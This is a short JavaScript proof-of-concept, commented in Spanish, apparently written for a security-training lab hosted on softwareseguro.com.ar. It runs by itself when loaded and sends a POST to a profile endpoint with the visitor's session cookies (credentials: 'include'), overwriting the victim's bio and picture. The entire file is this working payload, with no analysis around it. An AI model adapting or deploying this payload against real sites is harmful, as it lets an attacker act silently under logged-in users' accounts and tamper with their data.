// script.js - POC con Fetch
(async function() {
    'use strict';
    
    async function enviarPOCFetch() {
        const formData = new FormData();
        formData.append('bio', 'POC_FETCH_TEST_' + Date.now());
        formData.append('profile_pic', new Blob(), '');

        try {
            const response = await fetch('https://chl-3cdf64d4-f1bc-47d5-8eba-d734ad55354d-blog-hacklab-v2.softwareseguro.com.ar/profile', {
                method: 'POST',
                headers: {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                },
                body: formData,
                credentials: 'include'
            });

            console.log('✅ POC Fetch Exitosa - Status:', response.status);
            if (typeof alert !== 'undefined') {
                alert('POC Fetch Exitosa - Status: ' + response.status);
            }

        } catch (error) {
            console.error('❌ Error en POC Fetch:', error);
            if (typeof alert !== 'undefined') {
                alert('Error en POC: ' + error.message);
            }
        }
    }

    console.log('🚀 script.js cargado - Ejecutando POC Fetch...');
    enviarPOCFetch();
})();